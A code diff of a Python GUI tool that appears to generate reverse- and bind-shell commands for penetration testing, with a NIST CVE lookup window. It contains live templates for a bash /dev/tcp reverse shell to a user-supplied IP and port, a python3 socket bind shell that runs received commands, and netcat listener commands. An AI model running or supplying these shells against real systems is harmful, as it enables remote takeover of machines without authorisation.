@@ -1,8 +1,9 @@
 import customtkinter as cutk
-import emoji # Not working at the moment
 import requests
 import json
-
+import textwrap
+import server_part
+from PIL import Image, ImageTk
 
 PORT = int()
 IP = str("Your_IP")
@@ -11,7 +12,7 @@ shell_option = ["/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "pwsh", "as
 
 
 def check_cve(cve_id):
-    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
+    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}" #Testat pentru ID:CVE-2019-1010218
     try:
         response = requests.get(url)
         response.raise_for_status()  # Raise an error for non-200 status codes
@@ -19,18 +20,18 @@ def check_cve(cve_id):
         return cve_info
     except (requests.exceptions.RequestException, json.JSONDecodeError) as e:
         print("Error:", e)
-        return None
+        return None 
 
 def open_check_CVE_NIST():
     new_window = cutk.CTkToplevel(app)
     new_window.title("NIST API")
-    new_window.geometry("500x500")
+    new_window.geometry("600x400")
     
     label = cutk.CTkLabel(new_window, text="Enter CVE ID:")
-    label.pack()
+    label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
     
     entry = cutk.CTkEntry(new_window)
-    entry.pack()
+    entry.grid(row=0, column=1, padx=10, pady=10, sticky="w")
     
     def get_cve_info():
         cve_id = entry.get()
@@ -42,9 +43,9 @@ def open_check_CVE_NIST():
             cve_details = f"CVE ID: {cve['id']}\n"
             cve_details += "Description:\n"
             for description in cve["descriptions"]:
-                cve_details += f"- {description['value']} [{description['lang']}]\n"
-        
-        # Check if 'metrics' key exists before accessing it
+                wrapped_text = textwrap.fill(description['value'], width=80)  # Wrap text to 80 characters per line
+                cve_details += f"- {wrapped_text}\n"
+            
             if "metrics" in vulnerability:
                 cve_details += "Severity:\n"
                 for metric in vulnerability["metrics"].get("cvssMetricV3", []):
@@ -59,11 +60,11 @@ def open_check_CVE_NIST():
             result_label.configure(text="CVE not found or error in fetching details.")
 
     check_button = cutk.CTkButton(new_window, text="Check CVE", command=get_cve_info)
-    check_button.pack()
-    
-    result_label = cutk.CTkLabel(new_window, text="")
-    result_label.pack()
-    
+    check_button.grid(row=1, column=0, padx=10, pady=10)
+
+    result_label = cutk.CTkLabel(new_window, text="", width=500, height=300, anchor="nw", justify="left")
+    result_label.grid(row=2, column=0, columnspan=2, padx=10, pady=10, sticky="w")
+
     new_window.mainloop()
 
 # Function to clear the scrollable frame
@@ -85,18 +86,28 @@ def get_the_port_from_user(event):
     global PORT
     PORT = port_entry.get()
     print(f"nc -lvnp {PORT}")
-    # print(emoji.emojize('Python is fun :smile:', use_aliases=True)) # TO DO maybe
-    if int(PORT) < 1000:
-        listent_label.configure(text=f"sudo nc -lvnp {PORT}")
+    if int(PORT) <= 1024:
+        cat_image = Image.open("emoji/cry_cat.png")  # Replace with your emoji image path
+        cat_image = cat_image.resize((40, 40), Image.LANCZOS)  # Resize the image if necessary
+        cat_photo = ImageTk.PhotoImage(cat_image)
+
+                                                                    #cat_label = cutk.CTkLabel(master=listent_frame, text="", image=cat_photo)
+                                                                    #cat_label.grid(row=1, column=1)
+        listent_label.configure(text=f"   sudo nc -lvnp {PORT}",font=("Arial", 20), text_color="red")       #Nu am inteles de ce dar lucreaza si fara asta HZ de ce ?????
+        listent_label.configure(compound="left", image=cat_photo)
+                                                                    #cat_label.image = cat_photo
     else:
+        # Dacă portul nu este mai mic decât 1024, distrugeți emoji-ul cu pisică plângătoare
+        if 'cat_photo' in locals():
+            cat_photo.destroy()
         listent_label.configure(text=f"nc -lvnp {PORT}")
-    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
+    #shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
 
 def get_the_ip_from_user(event):
     global IP
     IP = ip_entry.get()
     print(f"IP input {IP}")
-    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
+    #shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
 
 def ret_bash_i():
     shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")
@@ -130,7 +141,7 @@ def ret_nc_c():
 
 def ret_python_bind():
     shell_label.configure(text=f'''
-python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",9001));s1.listen(1);c,a=s1.accept();
+python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("{IP}",{PORT}));s1.listen(1);c,a=s1.accept();
 while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
 ''')
 
@@ -238,13 +249,19 @@ MSF_venom.grid(row=0, column=2)
 scrollable_frame = cutk.CTkScrollableFrame(master=shell_frame, width=150, height=150)
 scrollable_frame.grid(row=1,column=0)
 
+pepega_image = Image.open("emoji/happy_pepe.png")  # Replace with your emoji image path
+pepega_image = pepega_image.resize((50, 50), Image.LANCZOS)  # Resize the image if necessary
+pepega_photo = ImageTk.PhotoImage(pepega_image)
 
-#copy_frame = cutk.CTkFrame(master=shell_frame, corner_radius=10,)
-#copy_frame.grid(row=1,column=1)
+#pepega_label = cutk.CTkLabel(master=shell_frame, text="", image=pepega_photo)
+#pepega_label.grid(row=1, column=1)
+#pepega_label.image = pepega_photo
 
-shell_label = cutk.CTkLabel(master=shell_frame, text="Enter your IP and Port PLS!!! 😄", font=("Aria", 20), wraplength=500)
+shell_label = cutk.CTkLabel(master=shell_frame, text="   Enter your IP and Port PLS!!!", font=("Aria", 20), wraplength=500)
 shell_label.grid(row=1, column=1 ,columnspan=2)
-#shell_label.columnconfigure(1, weight=2)
+
+# Utilizați opțiunea compound pentru a afișa imaginea și textul împreună
+shell_label.configure(compound="left", image=pepega_photo)
 
 copy_button = cutk.CTkButton(main_frame, text="Copy to Clipboard", command=copy_to_clipboard)
 copy_button.grid( row=3, column=1, pady=(10, 0), sticky='ew')
@@ -252,6 +269,6 @@ copy_button.grid( row=3, column=1, pady=(10, 0), sticky='ew')
 option_menu = cutk.CTkOptionMenu(master=shell_frame, values=shell_option, command=set_shell)
 option_menu.grid(row=3, column=3, pady=20, padx=20) 
 
-meme_button = cutk.CTkButton(master=main_frame, text="Easter Egg")
+meme_button = cutk.CTkButton(master=main_frame, text="🐣Easter Egg", command=server_part.open_local_server)
 meme_button.grid(row=3, column=0, pady=(10, 0), sticky='ew')
 app.mainloop()
